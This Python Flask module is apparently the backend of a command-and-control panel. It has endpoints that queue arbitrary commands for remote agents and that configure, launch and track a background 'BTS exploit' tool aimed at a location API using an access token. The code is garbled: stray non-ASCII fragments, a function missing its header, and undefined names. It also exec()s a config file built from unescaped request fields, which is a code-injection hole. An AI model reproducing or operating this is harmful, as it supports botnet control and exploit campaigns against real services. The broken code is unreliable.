 dıfrom datetime import datetime, timedelta
import os
import sys
import threading
import subprocess
import json
from pathlib import Path

from flask import Blueprint, request, jsonify, send_file

from server.models import Agent, Command, db
from server.webui import require_admin

esın

# Paths for BTS exploit integration
# Process state
LOG_FILE = EXPLOIT_DIR / 'logs' / 'bts_api_pentest.log'
REPORT_FILE = EXPLOIT_DIR / 'reports' / 'summary_report.txt'
CONFIG_FILE = EXPLOIT_DIR / 'config' / 'config.py'
EVENT_FILE = EXPLOIT_DIR / 'logs' / 'bts_events.jsonl'
_process_lock = threading.Lock()
_current_proc = {'popen': None, 'start_time': None}


# Dummy geolocation function since pygeoip is unavailable
def geolocation():
    return 'Local'


    """Update eklentiler/expoit/config/config.py with provided values, preserving others."""
    CONFIG_FILE.parent.mkdir(parents=True, exist_ok=True)

    # Defaults
    current = {
        'API_URL': 'https://127.0.0.1/bts/location',
        'ACCESS_TOKEN': 'YOUR_ACCESS_TOKEN',
        'MAX_RETRIES': 3,
        'THREAD_COUNT': 5,
        'MAIN_API_URL': 'http://127.0.0.1:5000/api',
    }
    # Load existing if available
    try:
        scope = {}
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            exec(f.read(), scope, scope)
        for k in list(current.keys()):
            if k in scope:
                current[k] = scope[k]
    except FileNotFoundError:
        pass

    # Apply updates
    if api_url is not None:
        current['API_URL'] = str(api_url)
    if access_token is not None:
        current['ACCESS_TOKEN'] = str(access_token)
    if max_retries is not None:
        current['MAX_RETRIES'] = int(max_retries)
    if thread_count is not None:
        current['THREAD_COUNT'] = int(thread_count)
    if main_api_url is not None:
        current['MAIN_API_URL'] = str(main_api_url)

    content = (
        f'API_URL = "{current["API_URL"]}"\n'
        f'ACCESS_TOKEN = "{current["ACCESS_TOKEN"]}"\n'
        f'MAX_RETRIES = {current["MAX_RETRIES"]}\n'
        f'THREAD_COUNT = {current["THREAD_COUNT"]}\n'
        f'MAIN_API_URL = "{current["MAIN_API_URL"]}"\n'
    )
    with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
        f.write(content)

    return current


def _start_bts_tool():
    """Start the BTS exploit main.py as a background subprocess."""
    with _process_lock:
        if _current_proc['popen'] and _current_proc['popen'].poll() is None:
            return False, 'already running', _current_proc['popen'].pid

        # Ensure directories exist
        EXPLOIT_DIR.mkdir(parents=True, exist_ok=True)
        (EXPLOIT_DIR / 'logs').mkdir(exist_ok=True)
        (EXPLOIT_DIR / 'reports').mkdir(exist_ok=True)

        # Launch using current python interpreter so requests is available
        python_exec = sys.executable
        cmd = [python_exec, 'main.py']

        # Detach output (the tool already logs to file)
        popen = subprocess.Popen(
            cmd,
            cwd=str(EXPLOIT_DIR),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            shell=False,
        )
        _current_proc['popen'] = popen
        _current_proc['start_time'] = datetime.utcnow()
        return True, 'started', popen.pid


def _status():
    """Return current run status."""
    with _process_lock:
        popen = _current_proc.get('popen')
        if not popen:
            return {'running': False}
        rc = popen.poll()
        return {
            'running': rc is None,
            'pid': popen.pid,
            'returncode': rc,
            'started_at': _current_proc.get('start_time').isoformat() if _current_proc.get('start_time') else None,
        }


# Agent command queue API
@api.route('/agent_communication', methods=['POST'])
def agent_communication():
    """
    Enqueue a command for an agent.
    Accepts: form or JSON with { agent_id: str, command: str }
    """
    data = request.form or (request.is_json and request.get_json(silent=True)) or {}
    agent_identifier = (data.get('agent_id') or data.get('agent') or '').strip()
    cmdline = (data.get('command') or data.get('cmd') or '').strip()

    if not agent_identifier or not cmdline:
        return jsonify({'ok': False, 'error': 'agent_id and command are required'}), 400

    agent = Agent.query.filter_by(agent_id=agent_identifier).first()
    if not agent:
        agent = Agent(agent_id=agent_identifier)
        db.session.add(agent)
        db.session.commit()

    agent.push_command(cmdline)
    return jsonify({'ok': True, 'message': 'command queued', 'agent_db_id': agent.id})


# BTS exploit configuration API
@api.route('/bts/config', methods=['POST'])
def bts_config():
    """
    Update BTS exploit configuration.
    JSON or form fields: api_url, access_token, max_retries, thread_count, main_api_url
    """
    payload = request.form or (request.is_json and request.get_json(silent=True)) or {}
    updated = _write_config(
        api_url=payload.get('api_url'),
        access_token=payload.get('access_token'),
        max_retries=payload.get('max_retries'),
        thread_count=payload.get('thread_count'),
        main_api_url=payload.get('main_api_url'),
    )
    return jsonify({'ok': True, 'config': updated})


# BTS exploit run API
@api.route('/bts/run', methods=['POST'])
def bts_run():
    """
    Run BTS exploit as background job using current config/config.py.
    Ensure ACCESS_TOKEN and API_URL are configured first via /api/bts/config.
    """
    # Validate config presence
    try:
        scope = {}
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            exec(f.read(), scope, scope)
        if scope.get('ACCESS_TOKEN') in (None, '', 'YOUR_ACCESS_TOKEN'):
            return jsonify({'ok': False, 'error': 'ACCESS_TOKEN is not set in config'}), 400
        if not scope.get('API_URL'):
            return jsonify({'ok': False, 'error': 'API_URL is not set in config'}), 400
    except FileNotFoundError:
        return jsonify({'ok': False, 'error': 'config.py not found, set via /api/bts/config'}), 400

    started, msg, pid = _start_bts_tool()
    return jsonify({'ok': started, 'message': msg, 'pid': pid, 'status': _status()})


# BTS exploit status API
@api.route('/bts/status', methods=['GET'])
def bts_status():
    return jsonify({'ok': True, 'status': _status()})


# BTS exploit event ingest API
@api.route('/bts/event', methods=['POST'])
def bts_event():
    """
    Receive single event from exploit runner.
    Fields: bts_id, status [success|warn|error|fail], message, extra (optional)
    """
    payload = request.form or (request.is_json and request.get_json(silent=True)) or {}
    event = {
        'ts': datetime.utcnow().isoformat(),
        'bts_id': payload.get('bts_id'),
        'status': payload.get('status'),
        'message': payload.get('message'),
        'extra': payload.get('extra'),
    }
    try:
        EVENT_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(EVENT_FILE, 'a', encoding='utf-8') as f:
            f.write(json.dumps(event, ensure_ascii=False) + '\n')
        return jsonify({'ok': True})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500


# BTS exploit log tail API
@api.route('/bts/log', methods=['GET'])
def bts_log():
    lines = int(request.args.get('lines', 200))
    try:
        with open(LOG_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            data = f.readlines()[-lines:]
        return jsonify({'ok': True, 'lines': data})
    except FileNotFoundError:
        return jsonify({'ok': False, 'error': 'log not found'}), 404


# BTS exploit summary report API
@api.route('/bts/report', methods=['GET'])
def bts_report():
    if REPORT_FILE.exists():
        return send_file(str(REPORT_FILE), as_attachment=False)
    return jsonify({'ok': False, 'error': 'report not found'}), 404
